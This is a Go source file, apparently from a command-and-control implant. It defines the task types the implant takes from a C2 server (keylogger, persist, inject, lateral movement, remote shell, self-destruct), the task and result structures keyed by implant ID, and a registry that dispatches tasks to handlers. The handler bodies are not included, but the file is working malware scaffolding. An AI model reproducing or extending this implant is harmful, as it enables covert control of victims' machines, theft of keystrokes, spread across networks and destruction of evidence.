package tasks

import (
	"time"
)

// Task types
const (
	TaskExec         = "exec"
	TaskDownload     = "download"
	TaskUpload       = "upload"
	TaskScreenshot   = "screenshot"
	TaskKeylogger    = "keylogger"
	TaskPersist      = "persist"
	TaskInject       = "inject"
	TaskLateral      = "lateral"
	TaskSleep        = "sleep"
	TaskSelfDestruct = "selfdestruct"
	TaskInfo         = "info"
	TaskShell        = "shell"
)

// Task represents a command from the C2 server
type Task struct {
	ID        string                 `json:"id"`
	Type      string                 `json:"type"`
	Args      map[string]interface{} `json:"args"`
	CreatedAt int64                  `json:"created_at"`
	Timeout   int                    `json:"timeout"` // timeout in seconds
}

// TaskResult represents the result of a task execution
type TaskResult struct {
	TaskID    string      `json:"task_id"`
	ImplantID string     `json:"implant_id"`
	Status    string      `json:"status"` // "success", "error", "running"
	Result    interface{} `json:"result,omitempty"`
	Error     string      `json:"error,omitempty"`
	Timestamp int64       `json:"timestamp"`
	Duration  int64       `json:"duration_ms"` // execution time in milliseconds
}

// TaskHandler defines the interface for task handlers
type TaskHandler func(task *Task, tun interface{}) TaskResult

// Registry holds all registered task handlers
var handlers = make(map[string]TaskHandler)

// Register registers a task handler
func Register(taskType string, handler TaskHandler) {
	if _, exists := handlers[taskType]; exists {
		panic("task handler already registered: " + taskType)
	}
	handlers[taskType] = handler
}

// Execute executes a task using the appropriate handler
func Execute(task *Task, tun interface{}) TaskResult {
	startTime := time.Now()
	
	handler, exists := handlers[task.Type]
	if !exists {
		return TaskResult{
			TaskID:    task.ID,
			Status:    "error",
			Error:     "unknown task type: " + task.Type,
			Timestamp: time.Now().Unix(),
			Duration:  time.Since(startTime).Milliseconds(),
		}
	}

	result := handler(task, tun)
	result.Duration = time.Since(startTime).Milliseconds()
	return result
}

// GetHandler returns a task handler by type
func GetHandler(taskType string) (TaskHandler, bool) {
	handler, exists := handlers[taskType]
	return handler, exists
}

// ListHandlers returns all registered task types
func ListHandlers() []string {
	var types []string
	for taskType := range handlers {
		types = append(types, taskType)
	}
	return types
}